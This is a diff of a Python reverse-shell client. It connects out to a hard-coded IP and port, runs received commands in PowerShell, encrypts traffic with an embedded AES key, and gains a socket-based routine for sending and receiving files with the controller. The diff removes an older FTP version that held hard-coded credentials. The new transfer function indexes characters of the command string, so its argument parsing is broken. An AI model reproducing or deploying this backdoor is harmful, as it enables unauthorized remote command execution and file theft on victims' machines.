@@ -2,15 +2,12 @@ import socket
 import os
 import subprocess
 import getpass
-from ftplib import FTP
 import time
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad,unpad
 
-HOST = "192.168.30.52"
+HOST = "192.168.140.65"
 PORT = 6565
-ftp_username = "Necati"
-ftp_password = "P;F3nj+qXp.N^H8!*=$#kl"
 aes_key = b'o\x802\x0ez\xe0\x8f\x8b\xc7>\xbf\x9fce\x85\xd3'
 
 
@@ -52,8 +49,7 @@ def connect():
                 info("[*] Connection closed !!!",client)
                 break
             elif command.split(" ")[0] == "ftp":
-                
-                stdout = ftp_connect(command)
+                stdout = ftp(command,client)
                 info(stdout,client)
                 continue
             stdout = subprocess.check_output(["powershell", "-Command",command])
@@ -68,33 +64,56 @@ def connect():
 
 
 
-def ftp_connect(command):
-    try:
-        command_parts = command.split()
-        command_type = command_parts[1]
-        filename = command_parts[2]
-        session = FTP()
-        session.connect(HOST)
-        session.login(user=ftp_username, passwd=ftp_password)
-        
-        if command_type == "-d":
-            # Upload file
-            with open(filename, 'rb') as f:
-                session.storbinary(f'STOR {filename}', f)
-            return f"[*] {filename} downloaded successfully."
-            
-        elif command_type == "-u":
-            # Download file
-            with open(filename, 'wb') as f:
-                session.retrbinary(f'RETR {filename}', f.write)
-            return f"[*] {filename}  uploaded successfully."
-            
-        else:
-            return "[*] Invalid option !!!"
-                
-    except Exception as e:
-        return f"Error: {e}"
+def ftp(command,client):
+    tip = command[1]
+    file = command[2]
 
+
+    def write(file,data):
+        with open(file,'wb') as f:
+            f.write(data)
+
+
+
+    def read(file):
+        with open(file,'rb') as f:
+            return f.read() 
+        
+
+    def parse_chunks(data, chunk_size=409600):
+        chunks = []
+        for i in range(0, len(data), chunk_size):
+            if i+ chunk_size < len(data):
+                chunks.append(data[i:i + chunk_size])
+            else : 
+                chunks.append(data[i:len(data)])
+        return chunks
+    
+
+    def download(file,client):
+        size = int(client.recv(4096).decode('utf-8'))
+        data = []
+        client.send(b"ready")
+        for i in range(size):
+            chunk = client.recv(409600)
+            data.append(chunk)
+        binary_data = b''.join(data)  
+        write(f"./{file}",binary_data)
+
+    def upload(file,client):
+        file = read(f".{file}")
+        parse_file =parse_chunks(file)
+        client.send(str(len(parse_file)).encode('utf-8'))
+        client.recv(409600)
+        for chunk in parse_file:
+            client.send(chunk)
+    
+    if tip == "-u":
+        download(file,client)
+    elif tip == "-d":
+        upload(file,client)
+    else :
+        return "[*] Wrong command !!!"  
 
 
 
